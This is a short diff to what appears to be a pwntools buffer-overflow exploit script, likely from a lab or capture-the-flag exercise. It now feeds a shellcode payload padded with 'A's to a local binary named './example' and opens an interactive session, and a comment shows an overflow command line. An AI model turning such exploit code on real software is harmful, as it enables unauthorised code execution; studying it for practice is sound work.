@@ -1,3 +1,4 @@
+#!/usr/bin/env python3
 """
 NOW
 ...
@@ -49,7 +50,8 @@ shellcode = {
 
 payload = flat(shellcode, filler=cycle(b'A'))
 
-sys.stdout.buffer.write(payload)
+with process(['./example', payload]) as p:
+    p.interactive()
 
 
 # ./example "$(python3 -c "print('A' * 77)")" 
